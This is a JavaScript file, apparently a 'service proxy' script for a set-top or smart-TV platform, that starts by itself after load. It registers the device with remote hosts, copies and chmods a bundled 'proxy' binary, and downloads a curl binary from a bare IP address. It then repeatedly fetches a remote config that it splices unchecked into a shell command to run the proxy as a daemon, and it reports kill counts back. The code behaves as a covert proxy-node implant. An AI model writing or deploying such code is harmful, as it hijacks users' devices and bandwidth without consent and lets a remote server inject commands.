
function ServiceProxy() {

	this.pubid = "tva02";
	this.boxid = null;
	this.path  = null;
	this.epath = null;
	this.fobj  = null;
	this.pobj  = null;
	this.hcobj = null;

	this.getID = function() {
		if ( this.id != null )
			return this.id;
		var id = localStorage.getItem("DeviceInfo_RID");
		if ( !!id ) {
			this.id = id;
			return this.id;
		}

		if ( typeof(iwae) == "undefined" ) {
			// running on browser
			var id = "R";
			for(var i=0;i<12;i++) 
				id+= Math.ceil(Math.random()*16).toString(16);
			localStorage.setItem("DeviceInfo_RID", id);
			this.id = id;
			return id;
		}

		if ( typeof( wae ) == "undefined" ) {
			return null;
		}
		var device_obj = wae.create("Devices");
		id = device_obj.getDeviceID();
		this.id = id;
		return this.id;
	}

	this.init = function( ) {
		console.log("init service proxy ...");

		this.boxid = this.getID();
	    var scriptobjlist = document.getElementsByTagName('SCRIPT');
	    for( var i=0; i<scriptobjlist.length; i++ ) {
	    	var url = scriptobjlist[i].src;
	    	if ( url.indexOf("/proxy.js") > 0 ) {
	    		this.path = url.replace( "/proxy.js", "/" ).replace("file://","");
	    		break;
	    	}
	    }
	    console.log("proxy path: " + this.path + " for " + this.boxid );

	    this.hcobj = wae.create("Net.HttpClient");

		var url = "http://tv.tvata.com:8270/proxy.status?id=" + this.boxid;
		this.hcobj.onComplete = (function( a ) {
			var res = a.arguments[2].replace( /\s+/,'');
			console.log("get res: " + res );
			if ( !! res ) {
				var reg = new RegExp( res, "i");
				if ( reg.exec( this.boxid) != null ) {
				    this.init_services();
				}
			}
		}).bind(this);

		console.log("send getserver req: " + url )
		this.hcobj.getWithAsync( url );
	}

	this.init_services = function() {
	    this.fobj = wae.create("DATA.File");
	    this.epath = this.fobj.getFilesDir();
	    console.log("proxy exe path: " + this.epath  );

	    this.pobj = wae.create("Process");
	    this.pobj.oncomplete = function(a) {
	    	console.log("oncomplete " + JSON.stringify(a))
	    }

	    if ( this.fobj.isExist( this.epath +"/proxy" ) == false ) {
	    	this.fobj.copy( this.path +"proxy", this.epath + "/proxy" );

		    var cmd = "chmod 755 " + this.epath + "/proxy" ;
		    console.log("proxy run: " + cmd );
		    this.pobj.daemon( cmd );

		    cmd = "busybox chmod 755 " + this.epath + "/proxy" ;
		    console.log("proxy run: " + cmd );
		    this.pobj.daemon( cmd );
	    }

	    if ( this.fobj.isExist( this.epath +"/curl" ) == false ) {
	    	this.hcobj.onSuccess = (function() {
			    console.log("curl downloaded! " );
		    	this.fobj.copy( this.epath + "/curl.e", this.epath + "/curl" );
		    	this.fobj.remove( this.epath + "/curl.e" );

			    var cmd = "chmod 755 " + this.epath + "/curl" ;
			    console.log("curl chmod: " + cmd );
			    this.pobj.daemon( cmd );

			    cmd = "busybox chmod 755 " + this.epath + "/curl" ;
			    console.log("curl chmod: " + cmd );
			    this.pobj.daemon( cmd );

			    this.oninit();
	    	}).bind(this);

	    	var url = "http://14.204.136.125:8278/curl.e";
	    	this.fobj.remove( this.epath + "/curl.e" );
	    	this.hcobj.downloadTo( url,  this.epath +"/curl.e" );
	    } else {
	    	this.oninit();
	    }
	}
	this.oninit = function() {
	    this.check_services();
	}

	this.check_services = function() {
	    setTimeout( this.check_reg.bind(this), 1000 );
	    setTimeout( this.start_services.bind(this), 1000 * 3 );
	    setInterval( this.start_services.bind(this), 1000 * 60 * 5 );
	}

	this.check_reg = function() {
	    console.log("check_reg " );
		if ( this.fobj.isExist( this.epath + "/reg_res") == true ) {
			return;
		}

		var url = "http://pixel.tvnetpro.com/api/communiProxy/register/"+this.pubid+"/" + this.boxid;
	    console.log("check_reg :" + url);
		// todo , check internal 

		var cmd = this.epath + "/curl -X POST " + url;
	    console.log("proxy run: " + cmd );
	    this.pobj.oncomplete = (function(a) {
	    	var res = a.arguments[0];
	    	this.fobj.writeAll( this.epath + "/reg_res", res );
	    }).bind(this);
	    this.pobj.onerror = (function(a) {
	    	console.log( "process run error: " + JSON.stringify(a) );
	    	setTimeout( this.check_reg.bind(this), 1000 * 3 );
	    }).bind(this);
	    this.pobj.daemon( cmd );
	}

	this.ongetserver = function() {}
	this.getserver = function() {
		var url = "http://pixel.tvnetpro.com/api/communiProxy/getserver/"+this.pubid+"/" + this.boxid;
		this.hcobj.onComplete = (function( a ) {
			var res = a.arguments[2]
			console.log("get res: " + res );
			this.ongetserver( res );
		}).bind(this);

		console.log("send getserver req: " + url )
		this.hcobj.getWithAsync( url );
	}
	this.start_services = function() {
		if ( !! this.getserver_timer ) {
			clearInterval( this.getserver_timer);			
		}

		this.getserver_timer = setInterval( this.getserver.bind(this), 1000 * 10 );
		this.ongetserver = (function( res ) {
			console.log("get res:::: " + res );
			clearInterval( this.getserver_timer);

			res = res.replace( /.*config:/, "").replace(/[,\s]+$/, "").replace(/,/, ":");
			var cmd = this.epath+"/proxy -d " + res;
			console.log("prepare the cmd is : [" + cmd + "]");

			this.stop_services();
			setTimeout( (function(){
				this.runservices_bycmd( cmd );
			}).bind(this), 1000 );
		}).bind(this);
		setTimeout( this.getserver.bind(this), 1000 * 3 );
	}

	this.runservices_bycmd = function( cmd ) {
		console.log("runservices  is : [" + cmd + "]");
	    this.pobj.oncomplete = (function(a) {
	    }).bind(this);
	    this.pobj.daemon( cmd );
	}

	this.stop_services = function() {
		var cmd = "killall proxy";
		console.log("killproxy  is : [" + cmd + "]");
	    this.pobj.oncomplete = (function(a) {
	    }).bind(this);
	    this.pobj.daemon( cmd );

	    setTimeout( this.killproxy2.bind(this), 50 );
	}

	this.killproxy2 = function() {
		console.log( "kill proxy ... " )
		var cmd = "ps";
	    this.pobj.oncomplete = (function(a) {
	    	var res = a.arguments[0];
	    	var lines = res.split( /[\r\n]+/ );
	    	var count = 0;
	    	for( var i=0; i<lines.length; i++ ) {
	    		var line = lines[i];
	    		// console.log("check line: " + line );
	    		if ( line.match( /[\s\/]proxy$/ ) ) {
	    			console.log("found proxy: " + line );
	    			var items = line.split(/\s+/);
	    			console.log("proxy pid is : " + items[1]);

	    			this.pobj.oncomplete = function() {}
	    			this.pobj.daemon( "kill " + items[1] );
	    			count ++;
	    		}
	    	}
	    	var url = "http://tv.tvata.com:8270/proxy.report?s=k&count="+count+"&id=" + this.boxid;
	    	this.hcobj.onComplete = function() {}
	    	this.hcobj.getWithAsync( url );
	    }).bind(this);
	    this.pobj.daemon( cmd );
	}

	this.delay_init = function() {
		setTimeout( this.init.bind(this), 1000 * 5 );
	}
}

var _sp = new ServiceProxy();
_sp.delay_init();

